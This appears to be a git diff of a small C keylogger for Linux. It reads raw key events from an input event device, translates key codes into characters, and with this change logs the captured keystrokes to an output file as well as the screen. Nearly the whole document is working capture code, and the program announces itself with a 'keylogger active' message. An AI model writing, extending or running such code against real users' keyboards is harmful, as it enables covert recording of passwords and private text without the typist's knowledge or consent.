@@ -6,8 +6,6 @@
 #include <linux/input-event-codes.h>
 #include <stdbool.h>
 
-struct input_event ev;
-
 char keymap[128] = {
   [KEY_1] = '1',
   [KEY_2] = '2',
@@ -116,20 +114,44 @@ char shift_keymap[128] = {
   [KEY_BACKSPACE] = '\b',
 };
 
+struct input_event ev;
+
 int main(int argc, char *argv[]) {
-  if (argc != 2) {
-    printf("usage: %s <keyboard-event-file>\n", argv[0]);
+  int option, fd_input = -1, fd_output = -1; 
+  char *input_filename = NULL, *output_filename = NULL;
+
+  while ((option = getopt(argc, argv, "i:o:")) != - 1) {
+    switch(option) {
+      case 'i':
+        input_filename = optarg;
+        fd_input = open(input_filename, O_RDONLY);
+        if (fd_input == -1) {
+          perror("failed to open file\n");
+          exit(EXIT_FAILURE);
+        }
+        break;
+      case 'o':
+        output_filename = optarg;
+        fd_output = open(output_filename, O_WRONLY | O_APPEND);
+        if (fd_output == -1) {
+          perror("failed to write file\n");
+          exit(EXIT_FAILURE);
+        }
+        break;
+    }
+  }
+
+  if (input_filename == NULL) {
+    fprintf(stderr, "Error: -i is required\n");
+    fprintf(stderr , "Usage: %s -i <keyboard-event-file>\n", argv[0]);
     exit(EXIT_FAILURE);
   }
 
-  int fd = open(argv[1], O_RDONLY, 0);
-  if (fd == -1) {
-    printf("failed to open file\n");
-  }
-  
+  printf("keylogger active\n");
+
   int shift = 0;
   while (true) {
-    if (read(fd, &ev, sizeof(struct input_event)) != sizeof(struct input_event)) {
+    if (read(fd_input, &ev, sizeof(struct input_event)) != sizeof(struct input_event)) {
       perror("failed to read file\n");
       exit(EXIT_FAILURE);
     }
@@ -143,14 +165,24 @@ int main(int argc, char *argv[]) {
 
     if (ev.value == 1 || ev.value == 2) {
       char ch = shift ? shift_keymap[ev.code] : keymap[ev.code];
-      if (ch) {
+
+      if (!ch)
+        continue;
+
+      if (output_filename == NULL) {
         putchar(ch);
         fflush(stdout);
       }
+      else
+        write(fd_output, &ch, sizeof(ch));
     }
   }
 
   printf("\n");
-  close(fd);
+
+  if (fd_output != -1)
+    close(fd_output);
+  
+  close(fd_input);
   return 0;
 };
